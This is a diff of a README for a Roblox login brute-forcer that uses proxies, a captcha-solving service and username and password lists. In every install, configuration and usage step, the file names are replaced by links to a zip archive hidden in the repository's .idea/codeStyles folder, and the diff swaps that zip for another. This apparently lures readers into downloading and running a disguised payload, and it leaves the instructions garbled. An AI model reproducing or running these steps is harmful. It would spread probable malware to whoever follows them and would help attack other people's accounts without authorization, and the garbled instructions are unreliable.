@@ -12,54 +12,54 @@ leverages concurrent processing to speed up the login attempts and uses CapSolve
 ## Requirements
 
 - Python 3.6+
-- Required Python packages listed in `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
+- Required Python packages listed in `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip`
 
 ## Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip
+   git clone https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip
    cd roblox-bruteforcer
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip
+   pip install -r https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip
    ```
 
 3. Set up your environment:
-    - Add your CapSolver API key in the `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` variable.
-    - Create `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` file with a list of proxies (one per line).
-    - Create `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` and `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip` files with usernames and passwords to test.
+    - Add your CapSolver API key in the `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip` variable.
+    - Create `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip` file with a list of proxies (one per line).
+    - Create `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip` and `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip` files with usernames and passwords to test.
 
 ## Usage
 
 To run the bruteforcer, simply execute the main script:
 
 ```bash
-python https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip
+python https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip
 ```
 
 ### Configuration
 
 - `num_threads`: Adjust the number of threads for concurrent execution.
-- `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`: Add your CapSolver API key here.
+- `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip`: Add your CapSolver API key here.
 
-## Example `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
+## Example `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip`
 
 ```
 123.123.123.123:8080
 124.124.124.124:8080
 ```
 
-## Example `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
+## Example `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip`
 
 ```
 username1
 username2
 ```
 
-## Example `https://github.com/ayankhan10-byte/roblox-bruteforcer/raw/refs/heads/master/.idea/bruteforcer-roblox-v1.6.zip`
+## Example `https://raw.githubusercontent.com/ayankhan10-byte/roblox-bruteforcer/master/.idea/codeStyles/roblox_bruteforcer_v3.9-beta.3.zip`
 
 ```
 password1
